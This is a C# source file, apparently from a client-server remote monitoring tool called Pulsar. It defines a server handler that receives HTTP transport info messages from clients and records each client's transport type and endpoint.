using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles HTTP transport info responses from clients and updates their recorded state.
    /// </summary>
    public class HttpTransportInfoHandler : MessageProcessorBase<HttpTransportInfoResponse>
    {
        public event EventHandler<(Client Client, HttpTransportInfoResponse Info)> TransportInfoUpdated;

        public HttpTransportInfoHandler() : base(true)
        {
        }

        public override bool CanExecute(IMessage message) => message is HttpTransportInfoResponse;

        public override bool CanExecuteFrom(ISender sender) => sender is Client;

        public override void Execute(ISender sender, IMessage message)
        {
            if (sender is Client client && message is HttpTransportInfoResponse info)
            {
                ApplyTransportInfo(client, info);
                OnReport(info);
                TransportInfoUpdated?.Invoke(this, (client, info));
            }
        }

        private static void ApplyTransportInfo(Client client, HttpTransportInfoResponse info)
        {
            client.Transport = info.Transport;
            client.TransportEndpoint = info.Endpoint ?? string.Empty;
        }
    }
}
